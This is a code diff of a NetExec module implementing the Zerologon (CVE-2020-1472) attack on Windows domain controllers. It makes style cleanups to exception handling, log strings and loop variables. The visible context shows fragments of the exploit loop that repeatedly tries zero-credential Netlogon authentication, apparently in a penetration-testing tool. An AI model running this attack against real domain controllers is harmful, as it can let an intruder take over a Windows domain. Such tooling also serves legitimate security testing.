@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # everything is comming from https://github.com/dirkjanm/CVE-2020-1472
 # credit to @dirkjanm
 # module by : @mpgn_x64
@@ -42,8 +40,8 @@ class NXCModule:
                     host.signing,
                     zerologon=True,
                 )
-            except Exception as e:
-                self.context.log.debug(f"Error updating zerologon status in database")
+            except Exception:
+                self.context.log.debug("Error updating zerologon status in database")
 
     def perform_attack(self, dc_handle, dc_ip, target_computer):
         # Keep authenticating until successful. Expected average number of attempts needed: 256.
@@ -54,19 +52,21 @@ class NXCModule:
             rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
             rpc_con.connect()
             rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
-            for attempt in range(0, MAX_ATTEMPTS):
+            for _attempt in range(MAX_ATTEMPTS):
                 result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                 if result:
                     return True
             else:
                 self.context.log.highlight("Attack failed. Target is probably patched.")
-        except DCERPCException as e:
-            self.context.log.fail(f"Error while connecting to host: DCERPCException, " f"which means this is probably not a DC!")
+        except DCERPCException:
+            self.context.log.fail("Error while connecting to host: DCERPCException, which means this is probably not a DC!")
+
 
 def fail(msg):
     nxc_logger.debug(msg)
     nxc_logger.fail("This might have been caused by invalid arguments or network issues.")
     sys.exit(2)
+
 
 def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     # Connect to the DC's Netlogon service.
